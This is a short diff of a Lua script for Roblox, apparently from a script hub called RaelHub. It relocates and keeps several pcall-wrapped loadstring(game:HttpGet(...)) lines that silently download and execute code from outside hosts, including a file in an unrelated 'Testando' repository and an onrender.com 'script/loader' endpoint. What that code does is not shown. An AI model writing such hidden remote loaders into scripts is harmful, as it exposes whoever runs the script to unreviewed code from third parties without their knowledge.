@@ -41,8 +41,6 @@ if not _G.RaelHubMonitorRunService then
     end
   end)
 end
-  
-pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/hypertext500/Testando/refs/heads/main/main.luau"))() end)
 
 function RaelHubFunction.ShowCountText(text, count)
   
@@ -255,8 +253,9 @@ end
 
 task.spawn(function()
 pcall(function()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/raelhubfunctions/Rael-hub-gui/refs/heads/main/Utils/tg.lua"))()
-  loadstring(game:HttpGet("https://script-executions.onrender.com/script/loader"))()      
+  loadstring(game:HttpGet("https://script-executions.onrender.com/script/loader"))()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/hypertext500/Testando/refs/heads/main/main.luau"))()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/raelhubfunctions/Rael-hub-gui/refs/heads/main/Utils/tg.lua"))()   
 end)
 end)
 
